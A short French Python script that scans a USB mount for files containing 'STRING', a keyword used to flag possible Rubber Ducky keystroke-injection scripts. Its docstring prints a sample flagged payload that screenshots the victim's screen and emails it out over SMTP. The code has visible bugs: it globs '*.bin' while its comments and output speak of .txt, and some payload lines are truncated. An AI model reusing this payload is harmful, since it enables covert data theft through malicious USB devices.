# -*- coding: utf-8 -*-
# !/usr/bin/python


# --- Script qui check si le mot clef "STRING" est présent dans un fichier .txt  ---

# -------- imports --------
import pathlib

# -------- Programme Principal --------

path="/media/pi/usb/"
a=0

print("Fichiers potentiellement dangereux : \n")

#On donne le chemin d'un dossier, puis on selectionne tous les fichiers .txt
for txt_file in pathlib.Path(path).glob('*.bin'):
	search_word = "STRING"
	# On ouvre chaque fichier pour voir s'il contient le mot clef d'un script ducky : "STRING"
	if search_word in open(txt_file).read():
		print(txt_file)
		a = a + 1


if a==1:
	print("\n",a,"supposé script rubber ducky a été détecté\n")
elif a>1:
	print("\n",a,"supposés scripts rubber ducky ont étés détectés\n")
else:
	print(a,"\n\nAucun scripts rubber ducky n'a été détecté\n")



"""
-------- Résultats de l'execution -------

root@kali:~/Documents/duck # python3 check_ducky_script.py
Fichiers potentiellement dangereux :

/root/Documents/duck/test3.txt

 1 supposé script rubber ducky a été détecté

root@kali:~/Documents/duck # cat test3.txt
PRINTSCREEN
ALT F4
REM ------------- Save screenshot as png ----------------------------
DELAY 100
GUI r
DELAY 250
STRING powershell
DELAY 250
ENTER
DELAY 250
STRING $screenshot = gcb -Format Image
ENTER
STRING $path =
ENTER
STRING $screenshot.Save($path, 'png')
ENTER
REM ------------- Email screenshot as an attachment -----------------
REM ------------- Enter email credentials here ----------------------
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('[SENDER EMAIL]', '[SENDER PASSWORD]');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = '[SENDER EMAIL]'
ENTER
STRING $ReportEmail.To.Add('[RECEIVER EMAIL]')
ENTER
STRING $ReportEmail.Subject = 'USER CREDENTIALS'
ENTER
STRING $ReportEmail.Body = 'Here are the usernames I found for you. Quack Quack.'
ENTER
STRING $ReportEmail.Attachments.Add('C
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 3000
STRING exit

"""
